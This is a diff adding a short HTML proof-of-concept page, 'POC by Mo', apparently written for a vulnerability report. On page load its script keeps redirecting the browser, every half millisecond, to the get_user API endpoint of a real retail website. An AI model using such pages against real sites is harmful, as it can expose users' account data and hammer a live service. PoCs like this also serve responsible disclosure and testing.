@@ -1,0 +1,19 @@
+<html>
+  <head>
+    <title>POC by Mo</title>
+  </head>
+  <body>
+<script>
+	function openlink()
+	{
+ 	  "use strict";
+  	  document.location="https://www.flightclub.com/web-api/v1/get_user?timestamp=1"
+	}
+	window.onload= function(){
+        'use strict';
+        setInterval(openlink,.5);
+        }
+        openlink();
+</script>
+  </body>
+</html>
